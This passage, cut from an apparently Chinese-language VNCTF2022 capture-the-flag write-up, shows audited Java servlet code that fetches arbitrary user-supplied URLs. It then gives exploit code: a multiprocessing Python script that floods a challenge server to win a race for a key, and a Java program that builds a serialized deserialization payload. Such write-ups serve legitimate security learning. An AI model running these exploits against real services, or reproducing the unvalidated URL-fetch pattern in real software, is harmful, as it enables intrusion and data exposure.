class=&#34;hljs-string&#34;&gt;&amp;#x27;\&amp;#x27;&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;, height=&amp;#x27;&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.height + &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\&amp;#x27;&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#125;&amp;#x27;&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;UrlUtil.java&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; util;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.*;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.net.*;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;UrlUtil&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;UrlUtil&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; InputStream &lt;span class=&#34;hljs-title&#34;&gt;visit&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String url)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; URL file = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; URL(url);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; InputStream inputStream = file.openStream();&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; inputStream;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;FileServlet.java&lt;/p&gt;
&lt;figure class=&#34;highlight scala&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs scala&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; servlet;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; javax.servlet.annotation.*;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; javax.servlet.http.*;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; util.*;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; org.apache.tomcat.util.http.fileupload.*;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.*;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; javax.servlet.*;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;@WebServlet&lt;/span&gt;(name = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;FileServlet&amp;quot;&lt;/span&gt;, urlPatterns = &amp;#123; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/file&amp;quot;&lt;/span&gt; &amp;#125;)&lt;br&gt;public &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;FileServlet&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;HttpServlet&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; void doGet(&lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;HttpServletRequest&lt;/span&gt; req, &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;HttpServletResponse&lt;/span&gt; resp) &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;ServletException&lt;/span&gt;, &lt;span class=&#34;hljs-type&#34;&gt;IOException&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; url = req.getParameter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;url&amp;quot;&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (url != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-type&#34;&gt;InputStream&lt;/span&gt; responseContent = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;br&gt;                responseContent = &lt;span class=&#34;hljs-type&#34;&gt;UrlUtil&lt;/span&gt;.visit(url);&lt;br&gt;                &lt;span class=&#34;hljs-type&#34;&gt;IOUtils&lt;/span&gt;.copy(responseContent, (&lt;span class=&#34;hljs-type&#34;&gt;OutputStream&lt;/span&gt;)resp.getOutputStream());&lt;br&gt;                resp.flushBuffer();&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (&lt;span class=&#34;hljs-type&#34;&gt;Exception&lt;/span&gt; e) &amp;#123;&lt;br&gt;                e.printStackTrace();&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;finally&lt;/span&gt; &amp;#123;&lt;br&gt;                responseContent.close();&lt;br&gt;            &amp;#125;&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;hljs-type&#34;&gt;Response&lt;/span&gt;(resp, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;please input a url&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; void &lt;span class=&#34;hljs-type&#34;&gt;Response&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;HttpServletResponse&lt;/span&gt; resp, &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; outStr) &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;IOException&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;ServletOutputStream&lt;/span&gt; out = resp.getOutputStream();&lt;br&gt;        out.write(outStr.getBytes());&lt;br&gt;        out.flush();&lt;br&gt;        out.close();&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;审计源码&lt;/p&gt;
&lt;p&gt;条件竞争拿 Key，EXP：&lt;/p&gt;
&lt;figure class=&#34;highlight processing&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs processing&#34;&gt;from multiprocessing &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; Pool&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; os, time, &lt;span class=&#34;hljs-built_in&#34;&gt;random&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;#http:&lt;span class=&#34;hljs-comment&#34;&gt;//1.13.163.248:8081/evi1?name=vnctf2022&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;def long_time_task(url):&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(url)&lt;br&gt;    cnt = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; True:&lt;br&gt;        cnt += &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; cnt%&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt; == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;又搞了100个请求&amp;quot;&lt;/span&gt;)&lt;br&gt;        r = requests.&lt;span class=&#34;hljs-built_in&#34;&gt;get&lt;/span&gt;(url,proxies=&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http&amp;quot;&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://127.0.0.1:8080&amp;quot;&lt;/span&gt;&amp;#125;)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;The Key is &amp;quot;&lt;/span&gt; in r.&lt;span class=&#34;hljs-built_in&#34;&gt;text&lt;/span&gt;:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;key&lt;/span&gt; = r.&lt;span class=&#34;hljs-built_in&#34;&gt;text&lt;/span&gt;&lt;br&gt;            with &lt;span class=&#34;hljs-built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;key.txt&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;) as f:&lt;br&gt;                f.write(&lt;span class=&#34;hljs-built_in&#34;&gt;key&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-built_in&#34;&gt;key&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; __name__==&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;br&gt;    p = Pool(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;)&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i in range(&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;):&lt;br&gt;        p.apply_async(long_time_task, args=(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://1.13.163.248:8081/evi1?name=vnctf2022&amp;quot;&lt;/span&gt;,))&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i in range(&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;):&lt;br&gt;        p.apply_async(long_time_task, args=(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://1.13.163.248:8081/evi1?name=vnctf20222&amp;quot;&lt;/span&gt;,))&lt;br&gt;    p.close()&lt;br&gt;    p.&lt;span class=&#34;hljs-built_in&#34;&gt;join&lt;/span&gt;()&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;构造反序列化 exp：&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; exp;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; entity.User;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.ByteArrayOutputStream;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.IOException;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.io.ObjectOutputStream;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.util.Base64;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; util.SerAndDe;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Main&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;  &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(String[] args)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; IOException &lt;/span&gt;&amp;#123;&lt;br&gt;    String name = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;m4n_q1u_666&amp;quot;&lt;/span&gt;;&lt;br&gt;    String age = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;666&amp;quot;&lt;/span&gt;;&lt;br&gt;    String height = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;180&amp;quot;&lt;/span&gt;;&lt;br&gt;    User user = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; User(name, age, height);&lt;br&gt;    ByteArrayOutputStream bos = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; ByteArrayOutputStream();&lt;br&gt;    ObjectOutputStream oos = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; ObjectOutputStream(bos);&lt;br&gt;    oos.writeObject(user);&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;byte&lt;/span&gt;[] ser = bos.toByteArray();&lt;br&gt;    Base64.Encoder encoder = Base64.getEncoder();&lt;br&gt;    String encodedText = encoder.encodeToString(ser);&lt;br&gt;    System.out.println(encodedText);&lt;br&gt;    User user2 = (User) SerAndDe.deserialize(ser);&lt;br&gt;    System.out.println(user2);&lt;br&gt;  &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意写个和 readObject 对应的 writeObject&lt;/p&gt;
&lt;figure class=&#34;highlight typescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span 